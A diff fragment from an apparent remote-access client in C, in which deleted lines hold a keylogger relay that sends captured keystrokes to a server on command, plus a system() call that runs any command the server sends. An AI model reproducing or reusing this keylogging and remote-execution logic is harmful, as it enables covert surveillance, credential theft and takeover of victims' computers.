@@ -55,28 +55,11 @@ int main() {
 	char charKey = '\0';
 	while (1) {
 		clearBuffer(buffer, sizeof(buffer));
-		//printf("MESSAGE:");
-		//secureInputString(buffer, sizeof(buffer) - 2);
-		//send(client_fd, buffer, strlen(buffer), 0);
-		//clearBuffer(buffer, sizeof(buffer));
 
 		int valread = recv(client_fd, buffer, sizeof(buffer) - 1, 0);
 		if (valread <= 0) break;
-		if(strcmp(buffer, "EXIT")== 0) break;
-		else if(strcmp(buffer, "KEYLOG START") == 0) {keylogPass = true; printf("OPERATE: %s", buffer);}
-		else if(strcmp(buffer, "KEYLOG STOP") == 0) {keylogPass = false; printf("OPERATE: %s", buffer);}
-
-		if(keylogPass) {
-			charKey = '\0';
-			charKey = logChar(); 
-			printf("SEND: %c\n", charKey);
-			clearBuffer(buffer, sizeof(buffer));
-			sprintf(buffer, "%c", charKey);
-			send(client_fd, buffer, strlen(buffer), 0);
-		}
 
 		buffer[valread] = '\0';
-		if(!keylogPass)system(buffer);
 	}
 
 	closesocket(client_fd);
